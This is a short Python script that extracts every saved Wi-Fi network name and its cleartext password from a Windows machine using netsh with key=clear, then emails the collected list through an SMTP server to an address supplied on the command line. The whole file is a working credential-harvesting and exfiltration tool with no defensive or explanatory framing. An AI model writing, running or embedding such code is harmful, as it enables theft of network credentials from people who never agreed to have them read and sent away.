#! py
import subprocess
import re
import smtplib
from email.message import EmailMessage
import argparse

arg_parser = argparse.ArgumentParser()
arg_parser.add_argument("-f", "--from-email-address", help="a from email address", required=True)
arg_parser.add_argument("-t", "--to-email-address", help="a to email address", required=True)
arg_parser.add_argument("--smtp-host", help="smtp host that sends email for you", required=True)
arg_parser.add_argument("--smtp-login-account", help="smtp login account", required=True)
arg_parser.add_argument("--smtp-login-password", help="smtp login password", required=True)
arg_parser.add_argument("--smtp-port", help="smtp port (default: 587)", required=False)
arg_parser.add_argument("-s", "--subject", help="subject of the email (default: \"WiFi SSIDs and Passwords\")", required=False)

# arguments example:
# ❯ python .\windows11-wifi-email.py \
#    -f hoge@example.com \
#    -t fuga@example.com \
#    --smtp-host smtp.example.com \
#    --smtp-login-account account@example.com \
#    --smtp-login-password xxxxxxxxxxxxxxx \
#    --subject "new mail arrived"

args = arg_parser.parse_args()

from_email_address = args.from_email_address
to_email_address = args.to_email_address
subject = args.subject or "WiFi SSIDs and Passwords"
smtp_host = args.smtp_host
smtp_port = args.smtp_port or 587
smtp_login_account = args.smtp_login_account
smtp_login_password = args.smtp_login_password

command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()

profile_names = (re.findall("All User Profile\s*:\s*(.*)\r", command_output))

wifi_list = list()

if len(profile_names) != 0:
    for name in profile_names:
        wifi_profile = dict()
        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output=True).stdout.decode()
        if re.search("Security key\s*:\s*Absent", profile_info):
            continue
        else:
            wifi_profile["ssid"] = name
            profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output=True).stdout.decode()
            password = re.search("Key Content\s*:\s*(.*)\r", profile_info_pass)
            if password == None:
                wifi_profile["password"] = None
            else:
                wifi_profile["password"] = password[1]
            wifi_list.append(wifi_profile)

email_message = ""
for item in wifi_list:
    email_message += f"SSID: {item['ssid']}, Password: {item['password']}\n"


email = EmailMessage()
email["from"] = from_email_address
email["to"] = to_email_address
email["subject"] = subject
email.set_content(email_message)

with smtplib.SMTP(host=smtp_host, port=smtp_port) as smtp:
    smtp.ehlo()
    smtp.starttls()
    smtp.login(smtp_login_account, smtp_login_password)
    smtp.send_message(email)

print(f"An email was sent to {to_email_address} 🍜")